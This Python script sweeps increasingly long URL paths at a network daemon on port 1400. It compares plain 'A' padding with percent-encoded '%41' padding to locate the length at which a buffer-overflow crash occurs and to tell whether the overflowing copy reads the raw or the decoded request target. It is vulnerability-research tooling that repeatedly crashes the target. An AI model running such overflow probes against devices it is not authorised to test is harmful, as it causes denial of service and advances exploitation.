#!/usr/bin/env python3
"""Decide whether the URL-span copy reads the raw target or a decoded buffer.

The splitter copies `span` bytes from a source pointer into a 5344-byte frame
(dst +16, so the frame edge is 5328 bytes). Two candidate sources:

  raw      the request target as received  -> break at ~5328 raw bytes for
           both alphabets
  decoded  a percent-decoded copy          -> '%41' is 3 raw bytes per decoded
           byte, so the break moves out to ~3x5328 raw bytes

So: sweep the same raw lengths with 'A' and with '%41' and compare where the
answer stops being 404 and where the daemon dies. Same break = raw source;
a 3x later break for '%41' = decoded source.

Measured on .202 (2026-10-26): both alphabets break at the same raw length
('A' first non-404 at 4020, '%41' at 3990) and '%41' is still broken at 12000
repeats = 36000 raw chars, i.e. the break does not move at all. The copy source
and the span are both the RAW target; the 1025-clamped decoded buffer is not
involved in this copy.

  ./urlspan_source.py 192.168.4.202 --compare
  ./urlspan_source.py 192.168.4.202 --alphabet pct41 --from 15000 --to 16500

Each sample records the code, the elapsed time, and whether the daemon is still
answering /info afterwards; a dead daemon is waited out before the next sample.
"""
import argparse
import json
import subprocess
import sys
import time

ALPHABETS = {"A": lambda n: "A" * n, "pct41": lambda n: "%41" * n}


def get(host, path, timeout):
    """curl, not urllib: urllib cannot reach the players from this host
    (scoped route, EHOSTUNREACH) while curl can."""
    t0 = time.monotonic()
    rc = subprocess.run(
        ["curl", "-s", "-m", str(timeout), "-o", "/dev/null",
         "-w", "%{http_code}", f"http://{host}:1400{path}"],
        capture_output=True, text=True,
    )
    dt = time.monotonic() - t0
    try:
        return int(rc.stdout.strip() or 0), dt
    except ValueError:
        return 0, dt


def alive(host, timeout=2.0):
    code, _ = get(host, "/info", timeout)
    return code == 200


def wait_alive(host, limit=30.0):
    end = time.monotonic() + limit
    while time.monotonic() < end:
        if alive(host):
            return True
        time.sleep(0.2)
    return False


def sweep(host, alphabet, lo, hi, step, timeout):
    make = ALPHABETS[alphabet]
    rows = []
    for n in range(lo, hi + 1, step):
        code, dt = get(host, "/zzz/" + make(n), timeout)
        up = alive(host)
        rows.append({"n": n, "code": code, "time": round(dt, 3), "alive": up})
        print(f"  n={n:<6} code={code:<4} {dt:6.3f}s alive={up}", flush=True)
        if not up:
            wait_alive(host)
    return rows


def breaks(rows):
    """First N that is no longer 404, and first N that kills the daemon."""
    first_change = next((r["n"] for r in rows if r["code"] != 404), None)
    first_dead = next((r["n"] for r in rows if not r["alive"]), None)
    return first_change, first_dead


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--alphabet", choices=sorted(ALPHABETS))
    ap.add_argument("--from", dest="lo", type=int, default=3900)
    ap.add_argument("--to", dest="hi", type=int, default=6000)
    ap.add_argument("--step", type=int, default=10)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--compare", action="store_true",
                    help="run both alphabets and compare the break points")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()

    if not alive(a.host):
        print(f"{a.host} is not answering /info", file=sys.stderr)
        return 2

    if a.compare:
        out = {}
        for alpha in ("A", "pct41"):
            print(f"[{alpha}] sweeping {a.lo}..{a.hi} step {a.step}", flush=True)
            rows = sweep(a.host, alpha, a.lo, a.hi, a.step, a.timeout)
            out[alpha] = {"rows": rows, "breaks": breaks(rows)}
            print(f"[{alpha}] first non-404={out[alpha]['breaks'][0]} "
                  f"first dead={out[alpha]['breaks'][1]}", flush=True)
        ra, rp = out["A"]["breaks"], out["pct41"]["breaks"]
        print()
        print(f"raw 'A'    : first non-404 {ra[0]}, first dead {ra[1]}")
        print(f"'%41' x3   : first non-404 {rp[0]}, first dead {rp[1]}")
        if ra[1] and rp[1]:
            ratio = rp[1] / ra[1]
            print(f"ratio {ratio:.2f}")
            if ratio < 1.5:
                print("VERDICT: same break -> the copy source is the RAW target")
            elif 2.5 < ratio < 3.5:
                print("VERDICT: break moved ~3x -> the copy source is DECODED")
            else:
                print("VERDICT: inconclusive ratio")
        if a.json:
            print(json.dumps(out))
        return 0

    if not a.alphabet:
        ap.error("--alphabet or --compare is required")
    rows = sweep(a.host, a.alphabet, a.lo, a.hi, a.step, a.timeout)
    change, dead = breaks(rows)
    print(f"\nfirst non-404={change} first dead={dead}")
    if a.json:
        print(json.dumps({"rows": rows, "breaks": [change, dead]}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
